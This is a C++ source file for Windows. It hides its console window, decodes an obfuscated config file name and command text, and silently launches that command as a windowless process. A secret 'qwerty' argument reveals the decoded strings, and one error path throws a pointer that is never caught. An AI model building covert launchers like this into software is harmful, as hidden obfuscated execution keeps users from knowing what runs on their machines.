#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

int main (int argc, char** argv
) {
try {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

static bool cfg = false;
    if (argc > 1) {
        string arg(argv[1]);
        if (arg == "qwerty") cfg = true;
    }

    if (!cfg) ShowWindow( GetConsoleWindow(), SW_HIDE );

static hide::line name("");
    name.decode();
    if (cfg) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open()) throw runtime_error("file not open");

static hide::line arg, cmd;
while ( getline(ini, arg)) {
    arg.decode();
    if (cfg) cout << arg << endl;
    else
        cmd.append(arg);
}
if (cfg) throw runtime_error("<<<<<<<<<< eof >>>>>>>>>>>>");

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
//  si.dwFlags = STARTF_USESHOWWINDOW;
//  si.wShowWindow = SW_HIDE;
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess ( NULL,   // No module name (use command line)
        (LPSTR)cmd.c_str(),  // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,  
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
     throw new runtime_error("create process fail");

 //   WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return 0;
} catch (const exception& e) {
    cerr << e.what() << endl;
    return -1;
}}